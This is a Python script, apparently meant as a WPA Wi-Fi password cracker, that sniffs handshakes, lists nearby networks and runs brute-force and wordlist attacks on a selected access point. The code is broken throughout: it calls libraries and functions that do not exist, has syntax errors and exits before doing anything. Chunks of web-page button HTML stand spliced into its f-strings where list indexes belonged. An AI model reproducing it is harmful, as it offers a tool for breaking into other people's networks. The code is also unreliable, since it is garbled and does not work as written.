import sys
from scapy.all import *
from pywifi import WiFi
from pycryptodome import RandPool
from concurrent.futures import ThreadPoolExecutor

# Defineconsts
MAX_ATTEMPTS = 20
ACCESSPOINT_MAC = "00:00:00:00:00:00"
MAX_WORKERS = 10
wifi = WiFi()

# Instantiate WiFi class
wifi.set_mode(WIFI_MODE_INTEL)

def wp_brutal(wpa, passkey):
    attempts = 0
    while not wpa.ssid and attempts < MAX_ATTEMPTS:
        rand = RandPool().read(16)
        wpa.passkey = rand.encode('UTF-8')
        wpa.auth()
        attempts += 1
    if wpa.ssid:
        print("\r[+] Found password: ", wpa.passkey.decode())
        return True
    else:
        return False

def mac_to_ip(mac):
    for addr in ARP(p dst=mac):
        return str(addr.psrc)

def process_network(net, pword_list):
    future = ThreadPoolExecutor()
    while net:
        future.submit(do_attack, (net, pword_list))
        net = future.pop()

def do_attack(args):
    net, pword_list = args
    answer = wp_brutal(WPA())
    if answer:
        print(f"\n[*] Password found for {net
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            1
          </span>
        </span>
      </a>
    </button>} ({net
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            0
          </span>
        </span>
      </a>
    </button>})")
        print(f"[+] Password is: {answer.passkey.decode()}")

def dictionary_attack(words):
    words = set(words)
    pword_iterator = iter(words)
    while True:
        word = next(pword_iterator)
        wp_brutal(WPA(word))
        if wifi.ssid:
            break
        else:
            continue

def read_pcap(pcап_file):
    return rdpcap(pcап_file)

def main():
    try:
        # Set interface in monitor mode
        wifi.set_mode(WIFI_MODE_MON)
        # Get and print interface name on terminal
        raise SystemExit
    except OSError:
        print("[-] Interface error, exiting... ")
        raise SystemExit

    if len(sys.argv) < 2:
        print("[-] No file passed, using default...")
        packet = sniff(iface=wlan, prn=searchhandshake)
    else:
        packet = read_pcap(sys.argv
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            1
          </span>
        </span>
      </a>
    </button>)

    networks, APMAC, APchannel, SSID = extract_networks(packet)
    print(f"[*] Found {len(networks)} networks admire")

    # Display networks
    for i, network in enumerate(networks):
        print(f"{i}) Channel: {network
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            0
          </span>
        </span>
      </a>
    </button>}, MAC: {network
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            1
          </span>
        </span>
      </a>
    </button>}, SSID: {network
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            2
          </span>
        </span>
      </a>
    </button>}")
        if input(f"Select {i} (You chose channel {network
  <button className="select-none no-underline">
  <a className="" href="" target="_blank">
        <span className="relative -top-[0rem] inline-flex">
          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
            0
          </span>
        </span>
      </a>
    </button>} and aim for {APMAC}) to attack the network?: ").lower() == "y":
            network = networks[i]
            pword_list = open(r"wordlist.txt", "rb").read().splitlines()
            process_network((network, pword_list))

if __name__ == "__main__":
    main()
